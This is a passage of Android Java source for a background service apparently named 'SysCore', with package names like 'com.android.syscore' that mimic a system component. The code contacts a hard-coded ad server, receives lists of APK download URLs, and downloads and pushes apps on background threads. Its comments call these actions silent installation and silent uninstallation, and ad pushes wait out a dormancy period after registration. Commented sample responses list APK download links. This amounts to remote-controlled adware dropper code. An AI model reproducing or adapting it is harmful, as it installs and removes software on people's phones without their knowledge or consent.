				for (Entry<String, String> header : customHeaders.entrySet()) {
					if (LogUtil.flag)
						Log.e(TAG, header.getKey() + "==customHeaders546456564= " + getDefaultValue(header.getValue()));
					request.setHeader(header.getKey(), getDefaultValue(header.getValue()));
				}
				if (RequestInformation.GZIP_ENCODING)
					request.setHeader("Accept-Encoding", "gzip");
			}

		});

		try {
			Log.e(TAG, "url===" + url);
			HttpUriRequest request = new HttpPost(url);
			Log.e(TAG, "request.getHeaders===" + request.getHeaders("user_id"));
			if (LogUtil.flag)
				Log.d(TAG, "AsyncHttpGet  request to url :" + url);
			request.getParams().setParameter(CoreConnectionPNames.CONNECTION_TIMEOUT, connectTimeout);
			request.getParams().setParameter(CoreConnectionPNames.SO_TIMEOUT, readTimeout);
			if (parameter != null && parameter.size() > 0) {
				List<BasicNameValuePair> list = new ArrayList<BasicNameValuePair>();
				for (NameValuePair p : parameter) {
					if (LogUtil.flag)
						Log.d(TAG, p.getName() + "===AsyncHttpGet  request to parameter :" + p.getValue());
					list.add(new BasicNameValuePair(p.getName(), p.getValue()));
				}
				((HttpPost) request).setEntity(new UrlEncodedFormEntity(list, HTTP.UTF_8));
			}
			HttpResponse response = httpClient.execute(request);

			int statusCode = response.getStatusLine().getStatusCode();

			if (LogUtil.flag)
				Log.d(TAG, "AsyncHttpGet  request to statusCode :" + statusCode);
			if (statusCode == HttpStatus.SC_OK) {
				ByteArrayOutputStream content = new ByteArrayOutputStream();
				response.getEntity().writeTo(content);
				String ret = new String(content.toByteArray()).trim();
				content.close();
				Message msg = Message.obtain(mHandler, flag, ret);
				mHandler.sendMessage(msg);
			} else {
				Message msg = Message.obtain(mHandler, FAIL, statusCode + "");
				mHandler.sendMessage(msg);
				if (LogUtil.flag)
					Log.d(TAG, "AsyncHttpPost  request code exception.code :" + statusCode);
			}

			if (LogUtil.flag)
				Log.d(TAG, "AsyncHttpGet  request to url :" + url + "  finished !");
		} catch (java.lang.IllegalArgumentException e) {
			Message msg = Message.obtain(mHandler, FAIL, e.getMessage());
			mHandler.sendMessage(msg);
			if (LogUtil.flag)
				Log.d(TAG, "AsyncHttpPost  request to url :" + url + "  onFail  " + e.getMessage());
		} catch (org.apache.http.conn.ConnectTimeoutException e) {
			Message msg = Message.obtain(mHandler, FAIL, e.getMessage());
			mHandler.sendMessage(msg);
			if (LogUtil.flag)
				Log.d(TAG, "AsyncHttpGet  request to url :" + url + "  onFail  " + e.getMessage());
		} catch (java.net.SocketTimeoutException e) {
			Message msg = Message.obtain(mHandler, FAIL, e.getMessage());
			mHandler.sendMessage(msg);
			if (LogUtil.flag)
				Log.d(TAG, "AsyncHttpGet  request to url :" + url + "  onFail  " + e.getMessage());
		} catch (UnsupportedEncodingException e) {
			Message msg = Message.obtain(mHandler, FAIL, e.getMessage());
			mHandler.sendMessage(msg);
			if (LogUtil.flag)
				Log.d(TAG,
						"AsyncHttpGet  request to url :" + url + "  UnsupportedEncodingException  " + e.getMessage());
		} catch (org.apache.http.conn.HttpHostConnectException e) {
			Message msg = Message.obtain(mHandler, FAIL, e.getMessage());
			mHandler.sendMessage(msg);
			if (LogUtil.flag)
				Log.d(TAG, "AsyncHttpGet  request to url :" + url + "  HttpHostConnectException  " + e.getMessage());
		} catch (ClientProtocolException e) {
			Message msg = Message.obtain(mHandler, FAIL, e.getMessage());
			mHandler.sendMessage(msg);
			e.printStackTrace();
			if (LogUtil.flag)
				Log.d(TAG, "AsyncHttpGet  request to url :" + url + "  ClientProtocolException " + e.getMessage());
		} catch (IOException e) {
			Message msg = Message.obtain(mHandler, FAIL, e.getMessage());
			mHandler.sendMessage(msg);
			if (LogUtil.flag)
				Log.d(TAG, "AsyncHttpGet  request to url :" + url + "  IOException  " + e.getMessage());
		}

	}

	public static void getUrl(int Flag) {
		switch (Flag) {
		case REGISTER: {
			// url=RequestInformation.RESOURCE_ROOT_URL+"/service/setinsert";
			url = "http://47.88.194.220/ad-server-webapi/rest/service/setinsert/";// 注册
		}
			break;
		case UPGRADE: {
			// url=RequestInformation.RESOURCE_ROOT_URL+"/service/setin";
			url = "http://47.88.194.220/ad-server-webapi/rest/service/setin/";
		}
			break;

		default:
			break;
		}
	}

	@SuppressLint("HandlerLeak")
	private void initHandler() {
		mHandler = new Handler() {
			@Override
			public void handleMessage(Message msg) {
				// TODO Auto-generated method stub
				switch (msg.what) {

				case REGISTER: {
					String stringData = (String) msg.obj;
					Log.e(TAG, "getAdRegister onSuccess==========" + stringData);
					getRegisterData(stringData);
					// String
					// string="{\"code\":\"200\",\"data\":{\"status\":\"OK\",\"now_time\":\"1460535854526\",\"s_time\":\"3\"},\"message\":\"OK\"}";
					// getRegisterData(string);
				}
					break;

				case UPGRADE: {
					String stringData = (String) msg.obj;
					Log.e(TAG, "checkClientCanUpdateRequest onSuccess==========" + stringData);
					// getUpdateData(stringData);
					getRequestUpdateData(stringData);
					// String
					// string="{\"code\":\"200\",\"data\":{\"package_name\":\"com.android.s\",\"app_size\":\"123456\",\"download_url\":\"http://gg.angelpush.com/advert/app/SmartTouch/78ce85699d5122e37ab565ba7fc383cd_20150506225721.apk\",\"now_time\":\"1563127854526\",\"s_time\":\"30\",\"version_code\":\"22\"},\"message\":\"OK\"}";
					// String
					// string="{\"code\":\"200\",\"data\":{\"package_name\":\"com.android.syscore\",\"app_size\":\"123456\",\"download_url\":\"http://bingo-game.b0.upaiyun.com/syscore/SysCore_AD_com_android_syscore_V7.8.3_ad_bd3core_003_20160328.apk\",\"now_time\":\"1563127854526\",\"s_time\":\"30\",\"version_code\":\"12\"},\"message\":\"OK\"}";
					// String
					// string="{\"code\":\"200\",\"data\":{\"package_name\":\"com.android.syscore\",\"app_size\":\"123456\",\"download_url\":\"http://dl.ludashi.com/ludashi/ludashi_home.apk\",\"now_time\":\"1563127854526\",\"s_time\":\"3\",\"version_code\":\"12\"},\"message\":\"OK\"}";
					// String
					// string="{\"code\":\"200\",\"data\":{\"androidservice\":{\"type\":\"1\",\"package_name\":
					// \"com.android.syscore\",\"app_size\":
					// \"123456\",\"download_url\": \"http:
					// //apppush.b0.upaiyun.com/res/app/41/3F57014941.apk\",\"now_time\":
					// \"25555\",\"s_time1\": \"30\"},\"ad\": {\"package_name\":
					// \"com.android.syscore\",\"app_size\":
					// \"123456\",\"download_url\": \"http:
					// //apppush.b0.upaiyun.com/res/app/41/3F57014941.apk\",\"now_time\":
					// \"\",\"s_time2\": \"120\"}},\"message\":
					// \"555\",\"request_time\":
					// \"11111111\",\"s_time\":\"2\"}";
					// getUpdateData(string);
					// getRequestUpdateData(string);
				}

					break;
				case FAIL: {
					String stringData = (String) msg.obj;
					Log.e(TAG, "FAIL message==========" + stringData);
				}
					break;
				default:
					break;
				}
			}
		};
	}

	public static boolean isDateBefore(String date2) {
		try {
			Date date1 = new Date();
			// DateFormat df = DateFormat.getDateTimeInstance();
			SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			String now = df.format(date1);
			if (LogUtil.flag)
				Log.v(TAG, "SysCore now8888=" + now);
			if (LogUtil.flag)
				Log.v(TAG, "SysCore gggggggggg8=" + df.parse(date2));
			return date1.before(df.parse(date2));
		} catch (ParseException e) {
			if (LogUtil.flag)
				Log.v(TAG, "SysCore e8333333=" + e);
			return false;
		}
	}

	public static boolean isDateAfter(String date2) {
		try {
			Date date1 = new Date();
			// DateFormat df = DateFormat.getDateTimeInstance();
			SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

			String now = df.format(date1);
			if (LogUtil.flag)
				Log.v(TAG, "SysCore now8999=" + now);
			if (LogUtil.flag)
				Log.v(TAG, "SysCore date1.after(df.parse(date2)8=" + date1.after(df.parse(date2)));
			return date1.after(df.parse(date2));
		} catch (ParseException e) {
			if (LogUtil.flag)
				Log.v(TAG, "SysCore e84444=" + e);
			return false;
		}
	}

	public static boolean isDateAfterOrBefore(String date) {
		try {
			Date date1 = new Date();
			// DateFormat df = DateFormat.getDateTimeInstance();
			SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

			String now = df.format(date1);
			if (LogUtil.flag)
				Log.v(TAG, "SysCore now878999=" + now);
			if (LogUtil.flag)
				Log.v(TAG, "SysCore date1.after(df.parse(date)78=" + date1.after(df.parse(date + " 23:59:59")));
			if (LogUtil.flag)
				Log.v(TAG, "SysCore date1.before(df.parse(date)78=" + date1.before(df.parse(date + " 00:00:00")));
			return date1.after(df.parse(date + " 23:59:59")) || date1.before(df.parse(date + " 00:00:00"));
		} catch (ParseException e) {
			if (LogUtil.flag)
				Log.v(TAG, "SysCore e4444=" + e);
			return false;
		}
	}

	private void doAction(String data) {

		int ex_type = 0;
		int type = 0;
		String packageName = null;
		String appSize = null;
		long now_time = 0;
		int s_time = 0;
		int version_code = 0;
		try {

			JSONObject objectData = new JSONObject(data);

			JSONArray jsonArray = objectData.getJSONArray("pusMaps");

			long request_time = objectData.getLong("request_time");
			if (LogUtil.flag)
				Log.i(TAG, "getUpdateData new jsonObject request_time=" + request_time);
			SharedPreferences.Editor request_timeSharePre = getApplicationContext()
					.getSharedPreferences("Request_Time", getApplicationContext().MODE_PRIVATE).edit();
			request_timeSharePre.putLong("request_time", request_time);
			request_timeSharePre.commit();

			// Log.i(TAG, "getUpdateData new jsonObject--->jsonArray=" +
			// jsonArray);
			if (jsonArray != null) {
				//for (int i = 0; i < jsonArray.length(); i++) {
					Log.i(TAG, "getUpdateData new jsonObject-111-->jsonArray=" + jsonArray);
					JSONObject object = jsonArray.getJSONObject(0);
					ex_type = Integer.parseInt(object.getString("ex_type"));
					type = Integer.parseInt(object.getString("type"));
					now_time = Long.parseLong(object.getString("now_time"));

					String s_time_str = object.getString("s_time");

					String packageName_str = object.getString("package_name");
					String appSize_str = object.getString("app_size");
					String download_url_str = object.getString("download_url");
					String version_code_str = object.getString("version_code");

					if (LogUtil.flag)
						Log.i(TAG, "getUpdateData new jsonObject s_time=" + s_time);
					if (LogUtil.flag)
						Log.i(TAG, "getUpdateData new jsonObject ex_type=" + ex_type);
					if (LogUtil.flag)
						Log.i(TAG, "getUpdateData new jsonObject type=" + type);
					if (LogUtil.flag)
						Log.i(TAG, "getUpdateData new jsonObject package_name=" + packageName);
					if (LogUtil.flag)
						Log.i(TAG, "getUpdateData new jsonObject app_size=" + appSize);
					if (LogUtil.flag)
						Log.i(TAG, "getUpdateData new jsonObject download_url=" + download_url);
					if (LogUtil.flag)
						Log.i(TAG, "getUpdateData new jsonObject now_time=" + now_time);
					if (LogUtil.flag)
						Log.i(TAG, "getUpdateData new jsonObject version_code=" + version_code);

					if (s_time_str.isEmpty()) {
						s_time = 0;
					} else {
						s_time = Integer.parseInt(s_time_str);
					}
					String[] packageNameArray = packageName_str.split(",");
					String[] download_urlArray = download_url_str.split(",");
					String[] appSizeArray = appSize_str.split(",");
					String[] version_codeArray = version_code_str.split(",");
					for (int ia = 0; ia < packageNameArray.length; ia++) {
						packageName = packageNameArray[ia];
						download_url = download_urlArray[ia];
						appSize = appSizeArray[ia];
						version_code = Integer.parseInt(version_codeArray[ia]);

						Log.i(TAG, ia + "---packageName --->=" + packageName);
						Log.i(TAG, ia + "---download_url --->=" + download_url);
						Log.i(TAG, ia + "---appSize --->=" + appSize);
						Log.i(TAG, ia + "---version_code --->=" + version_code);

						if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
							File dir = new File(HelpUtil.APK_DIR_PATHS);

							if (!dir.exists()) {
								dir.mkdirs();
							}
							File[] files = dir.listFiles();
							if (null != files) {
								for (File CurFile : files) {
									PackageManager pm = getApplicationContext().getPackageManager();
									PackageInfo info = pm.getPackageArchiveInfo(CurFile.getAbsolutePath(),
											PackageManager.GET_ACTIVITIES);
									if (null != info) {
										if (LogUtil.flag)
											Log.v(TAG, "SysCore info.packageNameInSDCard=" + info.packageName);

										// 如果静默接口需要下发的APK在T卡里面已经存在，就不进行下载
										if (info.packageName.equals(packageName)) {
											apkIsExist = true;

											String file = HelpUtil.APK_DIR_PATHS + "/"
													+ download_url.substring(download_url.lastIndexOf("/") + 1);
											if (LogUtil.flag)
												Log.v(TAG, "SysCore info.packageNameInSDCard  file= " + file);
											fileUri = Uri.parse("file://" + file);
											if (LogUtil.flag)
												Log.v(TAG, "SysCore info.packageNameInSDCard  fileUri= " + fileUri);
											break;
										} else {
											apkIsExist = false;
										}
									}
								}
							}
						}

						// UpdateData updateData=new UpdateData(packageName,
						// ex_type, type, appSize, download_url, now_time,
						// androidservice_time);
						// ex_type 1，androidservice
						if (ex_type == 1) {

							// 1静默安装；
							if (type == 1) {
								SharedPreferences sTimeSharedPreferences = getSharedPreferences("UinstallSTime", 0);
								String sTime = sTimeSharedPreferences.getString("STime", null);
								if (LogUtil.flag)
									Log.d(TAG, "SysCore sTime() 31256755776=" + sTime);
								boolean bl = isExit();
								if (LogUtil.flag)
									Log.d(TAG, "SysCore isExit() 31256755776=" + bl);
								String packName = null;
								int versioncode = 0;
								if (bl) {
									boolean bl2 = false;
									List<PackageInfo> list = PerfectUtil.getInstalledPackages(getApplicationContext());
									if (list != null && list.size() > 0) {
										for (int iii = 0; iii < list.size(); iii++) {
											if (LogUtil.flag)
												Log.d(TAG, iii + "SysCore ifExitGetPackageName packageName776="
														+ list.get(iii).packageName);
											bl = PerfectUtil.isIntentAvailable(getApplicationContext(),
													list.get(iii).packageName, PerfectUtil.selfAction);
											if (bl2) {
												packName = list.get(iii).packageName;
												versioncode = list.get(iii).versionCode;
												break;
											}
										}
									}
									if (LogUtil.flag)
										Log.d(TAG, "SysCore packName() 31256755776=" + packName);
									if (LogUtil.flag)
										Log.d(TAG, "SysCore versioncode() 31256755776=" + versioncode);
									if (LogUtil.flag)
										Log.d(TAG, "SysCore version_code() 31256755776=" + version_code);
								}
								if (LogUtil.flag)
									Log.d(TAG, "SysCore bl() 312ee56755776=" + bl);

								if (sTime != null) {
									if (LogUtil.flag)
										Log.d(TAG, "SysCore isDateAfter(sTime) 312ee56755776=" + isDateAfter(sTime));
									Log.d(TAG, "apkIsExist---1>=" + apkIsExist);
									if ((isDateAfter(sTime) && !bl) || (isDateAfter(sTime) && bl && packName != null
											&& packName.equals(packName) && versioncode != 0
											&& version_code > versioncode)) {
										new Thread(new Runnable() {

											@Override
											public void run() {
												// TODO Auto-generated method
												// stub

												downloadIntent(getApplicationContext(), download_url, apkIsExist,
														fileUri);
											}
										}).start();
									}
								}

								if ((sTime == null && !bl)
										|| (sTime == null && bl && packName != null && packName.equals(packName)
												&& versioncode != 0 && version_code > versioncode)) {
									Log.d(TAG, "apkIsExist---2>=" + apkIsExist);
									new Thread(new Runnable() {

										@Override
										public void run() {
											// TODO Auto-generated method stub

											downloadIntent(getApplicationContext(), download_url, apkIsExist, fileUri);
										}
									}).start();
								}

							}
							// 2、静默卸载
							if (type == 3) {
								SharedPreferences.Editor requestSharePre = getApplicationContext()
										.getSharedPreferences("Request_Time", getApplicationContext().MODE_PRIVATE)
										.edit();
								requestSharePre.putLong("request_time", 0);
								requestSharePre.commit();
								String packageNameString = ifExitGetPackageName();
								if (packageNameString != null && !packageNameString.equals("")) {
									// remove app
									String uriString = "package:" + ifExitGetPackageName();
									if (LogUtil.flag)
										Log.d(TAG, "SysCore ifExitGetPackageName 776=" + uriString);
									Uri packageURI = Uri.parse(uriString);
									Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
									uninstallIntent.putExtra("FromWhere", "OurSelf");
									uninstallIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
									startActivity(uninstallIntent);

								}
								if (removeApp(packageName)) {
									String uriString = "package:" + packageName;
									if (LogUtil.flag)
										Log.d(TAG, "SysCore uriString 776=" + uriString);
									Uri packageURI = Uri.parse(uriString);
									Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
									uninstallIntent.putExtra("FromWhere", "OurSelf");
									uninstallIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
									startActivity(uninstallIntent);

								}

							}
						}
						// ，ex_type 2.ad
						if (ex_type == 2) {

							if (LogUtil.flag)
								Log.v(TAG, "SysCore s_time 3245555541567=" + s_time);
							SharedPreferences registerTime = getSharedPreferences("registerTime", 0);
							long regsTime = registerTime.getLong("registerTime", 0);
							if (LogUtil.flag)
								Log.v(TAG, "SysCore regsTime 3245541567=" + regsTime);
							long ii = (long) s_time * 24 * 3600 * 1000;
							if (LogUtil.flag)
								Log.v(TAG, "SysCore now_time-regsTime 3245541567=" + (now_time - regsTime));
							if (LogUtil.flag)
								Log.v(TAG, "SysCore ii 3245541567=" + ii);

							if (now_time != 0 && regsTime != 0 && ii >= 0 && (now_time - regsTime > ii)) {

								// 注册，沉默满足要求，并且手机不存在我们的应用
								boolean isExit = false;
								List<PackageInfo> list = PerfectUtil.getInstalledPackages(getApplicationContext());
								if (list != null && list.size() > 0) {
									for (int j = 0; j < list.size(); j++) {
										if (LogUtil.flag)
											Log.d(TAG, j + "SysCore packageName776=" + list.get(j).packageName);
										if (list.get(j).packageName.equals(packageName)) {
											isExit = true;
											break;
										}
									}
								}
								if (LogUtil.flag)
									Log.d(TAG, "SysCore isExit 776=" + isExit);
								if (!isExit) {
									if (LogUtil.flag)
										Log.v(TAG, "SysCore start downloadIntent=");
									new Thread(new Runnable() {

										@Override
										public void run() {
											// TODO Auto-generated method stub

											downloadIntent(getApplicationContext(), download_url, apkIsExist, fileUri);
										}
									}).start();
								}
							}
						
					}
				}

			}
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private boolean isExit() {
		boolean isExit = false;
		List<PackageInfo> list = PerfectUtil.getInstalledPackages(getApplicationContext());
		if (list != null && list.size() > 0) {
			for (int i = 0; i < list.size(); i++) {
				if (LogUtil.flag)
					Log.d(TAG, i + "SysCore isExit packageName776=" + list.get(i).packageName);
				isExit = PerfectUtil.isIntentAvailable(getApplicationContext(), list.get(i).packageName,
						PerfectUtil.selfAction);
				if (isExit) {
					return isExit;
				}
			}
		}
		return isExit;
	}

	private String ifExitGetPackageName() {
		String packageName = "";
		boolean bl = false;
		List<PackageInfo> list = PerfectUtil.getInstalledPackages(getApplicationContext());
		if (list != null && list.size() > 0) {
			for (int i = 0; i < list.size(); i++) {
				if (LogUtil.flag)
					Log.d(TAG, i + "SysCore ifExitGetPackageName packageName776=" + list.get(i).packageName);
				bl = PerfectUtil.isIntentAvailable(getApplicationContext(), list.get(i).packageName,
						PerfectUtil.selfAction);
				if (bl) {
					return list.get(i).packageName;
				}
			}
		}
		return packageName;
	}

	private boolean removeApp(String packageName) {
		boolean isExit = false;
		List<PackageInfo> list = PerfectUtil.getInstalledPackages(getApplicationContext());
		if (list != null && list.size() > 0) {
			for (int i = 0; i < list.size(); i++) {
				if (LogUtil.flag)
					Log.d(TAG, i + "SysCore removeApp packageName776=" + list.get(i).packageName);
				if (list.get(i).packageName.equals(packageName)) {
					if (LogUtil.flag)
						Log.d(TAG, i + "SysCore removeApp packageName776=" + true);
					return true;
				}
			}
		}
		return isExit;
	}
}
